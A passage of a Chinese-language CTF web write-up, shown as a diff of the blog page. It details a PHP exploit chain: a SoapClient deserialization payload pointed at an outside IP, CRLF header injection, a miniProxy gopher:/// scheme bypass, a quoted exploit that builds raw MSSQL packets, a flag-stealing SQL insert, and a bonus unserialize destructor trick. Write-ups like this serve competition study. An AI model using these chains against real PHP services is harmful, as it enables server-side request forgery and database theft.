+</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span> <span class=k>as</span> <span class=nv>$attach</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;&lt;li&gt;</span><span class=si>$attach</span><span class=s2>&lt;/li&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;&lt;/il&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$str</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>而我们看<code>Post::loadall()</code>，我们可以发现</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>load</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$USER</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$res</span> <span class=o>=</span> <span class=nx>DB</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM posts WHERE userid = ? AND id = ?&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                     <span class=k>array</span><span class=p>(</span><span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>,</span> <span class=nv>$id</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$res</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;db error&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$res</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$post</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Post</span><span class=p>(</span><span class=nv>$res</span><span class=p>[</span><span class=s2>&#34;title&#34;</span><span class=p>],</span> <span class=nv>$res</span><span class=p>[</span><span class=s2>&#34;content&#34;</span><span class=p>],</span> <span class=nv>$res</span><span class=p>[</span><span class=s2>&#34;attachment&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$post</span><span class=o>-&gt;</span><span class=na>id</span> <span class=o>=</span> <span class=nv>$id</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$post</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>loadall</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$USER</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$result</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$posts</span> <span class=o>=</span> <span class=nx>DB</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;SELECT id FROM posts WHERE userid = ? ORDER BY id DESC&#34;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>))</span> <span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$posts</span><span class=p>)</span> <span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$posts</span> <span class=k>as</span> <span class=nv>$p</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$result</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>Post</span><span class=o>::</span><span class=na>load</span><span class=p>(</span><span class=nv>$p</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p><code>loadall()</code>方法会逐个通过 id 调用<code>load()</code>方法，根据前面的<code>Post</code>构造方法与<code>save()</code>方法，我们可以找到保存<code>attachment</code>的方式。其实这里因为<code>echo</code>输出的是<code>$post['title']</code>、<code>$post['content']</code>，所以我们也可以放在这两者中，都会触发<code>__toString</code>的魔术方法</p><p>所以大概的流程就是我们通过构造好一个<code>SoapClient</code>的 payload ，插入之后访问 default.php 触发<code>echo</code>，调用<code>$this->za->open()</code>，接着触发<code>SoapClient</code>的<code>__call()</code>魔术函数完成一次反序列化攻击。</p><p>因为<code>echo</code>直接调用了反序列化的<code>__toString</code>魔术方法，我们可以直接利用<code>Attachment</code>这个类来构造 payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>Attachment</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$za</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;http://106.14.153.173:2015&#39;</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;123&#39;</span><span class=p>));</span>   
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>Attachment</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$aaa</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$aaa</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$aaa</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span></code></pre></div><p>利用反序列化的特点，我们可以直接定义私有变量的值，但是字符串中会有不可见字符，实验如下</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005682.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005682.jpg loading=lazy></a></figure></p><p>所以我们需要用<code>base64_encode</code>进行编码，把编码得到的字符串再在 burp 里面进行解码构造请求。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008851.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008851.jpg loading=lazy></a></figure></p><h4 id=soapclient-ssrf>SoapClient SSRF</h4><p>根据 hint1 ，flag 在数据库里，源码中含有数据库信息，因此我们可以利用<code>SoapClient</code>通过 SSRF 打 MSSQL。而题目也给我们提供了 miniProxy.php ，我们可以在 <a class=link href=https://github.com/joshdick/miniProxy target=_blank rel=noopener>github</a> 上可以看到相关使用说明</p><blockquote><p>​ miniProxy should be able to run on any web server with PHP 5.4.7 or later. miniProxy requires PHP&rsquo;s <code>curl</code> and <code>mbstring</code>extensions to be installed.</p></blockquote><p>大概就是一个可以让我们访问内部服务的工具。然后我们根据备份文件 default.backup 得到</p><pre tabindex=0><code>server {
     listen 127.0.0.1:8080;
     access_log /var/log/nginx/proxy.log;
 
@@ -337,305 +193,100 @@ Task Completed
     }
     
 }
-</code></pre><p>当我们请求 8080 的时候，请求的是 miniProxy，但是只能用 GET 请求，而我们之前可以发现<code>SoapClient</code>只能发 POST 请求</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005778.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005778.jpg loading=lazy>
-</a>
-</figure></p>
-<p>这里大概思路也比较清晰了，就是利用 miniProxy 使用 gopher 协议去访问 mssql 数据库拿到 flag ，但是怎么处理让<code>SoapClient</code>发送 GET 请求呢？</p>
-<p>####SoapClient CRLF injection</p>
-<p>发送 GET 请求我们就不得不又用到<code>SoapClient</code>的另一个选项</p>
-<blockquote>
-<p><strong>options</strong></p>
-<p>An array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, the <em>location</em> and <em>uri</em> options must be set, where <em>location</em> is the URL of the SOAP server to send the request to, and <em>uri</em> is the target namespace of the SOAP service.</p>
-<p>&mldr;</p>
-<p>The <em>user_agent</em> option specifies string to use in <em>User-Agent</em> header.</p>
-</blockquote>
-<p>而且在 header 里 <code>User-Agent</code> 在 <code>Content-Type</code> 前面，这里我们可以使用 CRLF 进行分隔请求，构造 GET 请求。</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005475.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005475.jpg loading=lazy>
-</a>
-</figure></p>
-<h4 id=miniproxy-url-scheme-bypass>miniProxy URL scheme bypass</h4>
-<p>我们自己本地看看 MiniProxy 怎么用。</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003617.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003617.jpg loading=lazy>
-</a>
-</figure></p>
-<p>随便测一个<code>file:///etc/passwd</code>，返回</p>
-<pre tabindex=0><code>Error: Detected a &quot;file&quot; URL. miniProxy exclusively supports http[s] URLs.
-</code></pre><p>然后我们定位到代码区</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$scheme</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_SCHEME</span><span class=p>);</span>
-<span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$scheme</span><span class=p>))</span> <span class=p>{</span>
-  <span class=c1>//Assume that any supplied URLs starting with // are HTTP URLs.
-</span><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=s2>&#34;//&#34;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-    <span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;http:&#34;</span> <span class=o>.</span> <span class=nv>$url</span><span class=p>;</span>
-  <span class=p>}</span>
-<span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^https?$/i&#34;</span><span class=p>,</span> <span class=nv>$scheme</span><span class=p>))</span> <span class=p>{</span>
-    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Error: Detected a &#34;&#39;</span> <span class=o>.</span> <span class=nv>$scheme</span> <span class=o>.</span> <span class=s1>&#39;&#34; URL. miniProxy exclusively supports http[s] URLs.&#39;</span><span class=p>);</span>
-<span class=p>}</span>
-</code></pre></div><p>发现是这个地方有个正则判断，开头必须以<code>https</code>或者<code>http</code>，然而我们需要用到 gopher 协议，就需要绕过这里。这里也就需要一个小 trick 了</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$scheme</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_SCHEME</span><span class=p>);</span>	<span class=c1>// 遇到 gopher:/// 时会解析失败，返回false
-</span><span class=c1></span><span class=k>empty</span><span class=p>(</span><span class=nv>$scheme</span><span class=p>)</span>								<span class=c1>// empty(false) 为 true
-</span></code></pre></div><p>这样我们就可以使用<code>gopher:///</code>绕过<code>die</code>的限制执行下面的 <code>$response = makeRequest($url);</code> 请求函数了。</p>
-<p>这里也可以使用一个 301 进行跳转。</p>
-<h4 id=connect-to-mssql-via-gopher>Connect to MSSQL via gopher</h4>
-<p>怎么构造gopher包呢，这是个比较麻烦的事，之前在另外一个比赛上用 tcpdump 抓自己的 mysql 的数据包然后进行 gopher ，这里也是类似的。这里就不再做了，直接拿官方给的 exp 看看吧。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=c1>// the prelogin and login packets can either be assembled
-</span><span class=c1>// by hand if you are into that kind of stuff.
-</span><span class=c1>// or you can just use wireshark :)
-</span><span class=c1></span><span class=nv>$prelogin_packet</span>  <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x12\x01\x00\x2f\x00\x00\x01\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x1a\x00\x06\x01\x00\x20</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x01\x02\x00\x21\x00\x01\x03</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x22\x00\x04\x04\x00\x26\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x01\xff\x00\x00\x00\x01\x00\x01</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x02\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-
-<span class=nv>$login_packet</span>  <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x10\x01\x00\xde\x00\x00\x01\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xd6\x00\x00\x00\x04\x00\x00\x74</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x10\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x54\x30\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xe0\x00\x00\x08\xc4\xff\xff\xff</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x09\x04\x00\x00\x5e\x00\x07\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6c\x00\x0a\x00\x80\x00\x08\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x90\x00\x0a\x00\xa4\x00\x09\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xb6\x00\x00\x00\xb6\x00\x07\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xc4\x00\x00\x00\xc4\x00\x09\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x01\x02\x03\x04\x05\x06\xd6\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\xd6\x00\x00\x00\xd6\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x00\x00\x00\x00\x61\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x77\x00\x65\x00\x73\x00\x6f\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6d\x00\x65\x00\x63\x00\x68\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x61\x00\x6c\x00\x6c\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6e\x00\x67\x00\x65\x00\x72\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xc1\xa5\x53\xa5\x53\xa5\x83\xa5</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xb3\xa5\x82\xa5\xb6\xa5\xb7\xa5</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6e\x00\x6f\x00\x64\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x2d\x00\x6d\x00\x73\x00\x73\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x71\x00\x6c\x00\x6c\x00\x6f\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x63\x00\x61\x00\x6c\x00\x68\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6f\x00\x73\x00\x74\x00\x54\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x65\x00\x64\x00\x69\x00\x6f\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x75\x00\x73\x00\x63\x00\x68\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x61\x00\x6c\x00\x6c\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6e\x00\x67\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-
-
-<span class=c1>// need to add a ;-- - to execute the query successfully,
-</span><span class=c1>// because gopher adds a \x0d\x0a to the end of the request
-</span><span class=c1>// and for some reaason the query does not execute if we don&#39;t
-</span><span class=c1>// comment that out
-</span><span class=c1></span><span class=nv>$query</span> <span class=o>=</span> <span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;;-- -&#34;</span><span class=p>;</span>
-<span class=nv>$query</span> <span class=o>=</span> <span class=nx>mb_convert_encoding</span><span class=p>(</span><span class=nv>$query</span><span class=p>,</span> <span class=s2>&#34;utf-16le&#34;</span><span class=p>);</span>
-
-<span class=c1>// the length of the packet is the length of the query +
-</span><span class=c1>// the length of the header (30 bytes) + the \x0d\x0a added
-</span><span class=c1>// by gopher protocol
-</span><span class=c1></span><span class=nv>$length</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=o>+</span> <span class=mi>30</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
-<span class=nv>$query_packet</span>  <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x01\x01</span><span class=s2>&#34;</span> <span class=o>.</span> <span class=nx>pack</span><span class=p>(</span><span class=s2>&#34;n&#34;</span><span class=p>,</span> <span class=nv>$length</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x01\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$query_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x16\x00\x00\x00\x12\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$query_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x02\x00\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$query_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x01\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
-<span class=nv>$query_packet</span> <span class=o>.=</span> <span class=nv>$query</span><span class=p>;</span>
-
-<span class=nv>$payload</span> <span class=o>=</span> <span class=nv>$prelogin_packet</span> <span class=o>.</span> <span class=nv>$login_packet</span> <span class=o>.</span> <span class=nv>$query_packet</span><span class=p>;</span>
-</code></pre></div><p>可以看到这里需要加入一个<code>;-- -</code>，是为了注释掉<code>\x0a\x0a</code>，这是 gopher 自动添加的内容，不然 query 无法成功执行。</p>
-<h4 id=get-flag>Get Flag</h4>
-<p>基本的利用点都分析完了，最后这道题还比较良心地在 bootstrap.php 中设置了</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;HTTP_DEBUG&#34;</span><span class=p>]))</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$USER</span><span class=p>);</span>
-</code></pre></div><p>可以看到自己的 UID</p>
-<p>这个可以用来干嘛呢？当然是用来注入了啦，直接在自己的 post 中获取相关的信息</p>
-<pre tabindex=0><code class=language-mssql data-lang=mssql>insert into posts (userid, title, content, attachment) values ({}, &quot;foobar&quot;, (select flag from flag.flag), &quot;foobar&quot;);
-</code></pre><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007735.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007735.jpg loading=lazy>
-</a>
-</figure></p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000709.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000709.jpg loading=lazy>
-</a>
-</figure></p>
-<h3 id=conclusion>Conclusion</h3>
-<p>整个复现完还是感觉比较有难度的，特别是整个构造链都比较有意思。通过<code>SoapClient</code>反序列化到 gopher SSRF 到 CRLF 再到 Get Flag，整个流程需要的技巧以及对自己的能力要求比较高，整体下来学习了不少。主要都是与<code>SoapClient</code>相关，还是比较 Nice 的题目，也重新认识了反序列化漏洞。整体都比较赞。</p>
-<h2 id=php--bonus>php — Bonus</h2>
-<h3 id=description-1>Description</h3>
-<blockquote>
-<p>​ PHP&rsquo;s unserialization mechanism can be exceptional.</p>
-</blockquote>
-<p>给个 bonus 吧，也算是一道简单的序列化题目</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
-<span class=nv>$line</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nx>fgets</span><span class=p>(</span><span class=nx>STDIN</span><span class=p>));</span>
-<span class=nv>$flag</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span>
-<span class=k>class</span> <span class=nc>B</span> <span class=p>{</span>
-    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
-        <span class=k>global</span> <span class=nv>$flag</span><span class=p>;</span>
-        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
-    <span class=p>}</span>
-<span class=p>}</span>
-
-<span class=nv>$a</span> <span class=o>=</span> <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$line</span><span class=p>);</span>
-<span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s1>&#39;Well that was unexpected…&#39;</span><span class=p>);</span>
-<span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=err>
-</span></code></pre></div><h3 id=hacking-1>Hacking</h3>
-<p>Php 正常的类调用析构函数一般会在脚本结束的时候，然而这里要想拿到 flag ，就需要调用析构函数。然而<code>unserialize</code>正常解析类的时候不会调用析构函数，但是当解析出错的时候，如果类名是正确的，就会调用这个类的析构函数，比如正常序列化出来的类是这样的<code>O:1:"B":0:{}</code>，只要我们让他解析出错就可以调用析构函数了，所以以下随便用一个就好了</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;B&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{</span>
-<span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;B&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{}</span>
-</code></pre></div>
-</section>
-<footer class=article-footer>
-<section class=article-tags>
-<a href=/tags/CTF/>CTF</a>
-<a href=/tags/wp/>wp</a>
-</section>
-<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>Licensed under CC BY-NC-SA 4.0</span>
-</section>
-<div class="notice notice-tip">
-<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
-<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
-<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
-</div>
-</footer>
-</article>
-<aside class=related-contents--wrapper>
-<h2 class=section-title>Related contents</h2>
-<div class=related-contents>
-<div class="flex article-list--tile">
-<article>
-<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>
-<div class=article-details>
-<h2 class=article-title>Plaid CTF 2020 Catalog</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2020/04/20/Plaid-CTF-2020-Web-1/>
-<div class=article-details>
-<h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2019/06/04/2019qwb/>
-<div class=article-details>
-<h2 class=article-title>2019强网杯部分Web wp</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2019/05/30/2019iscc/>
-<div class=article-details>
-<h2 class=article-title>2019 ISCC Web wp</h2>
-</div>
-</a>
-</article>
-<article>
-<a href=/2019/05/09/2019ciscn-RefSpace/>
-<div class=article-details>
-<h2 class=article-title>2019 CISCN RefSpace</h2>
-</div>
-</a>
-</article>
-</div>
-</div>
-</aside>
-<div class=disqus-container>
-<div id=disqus_thread></div>
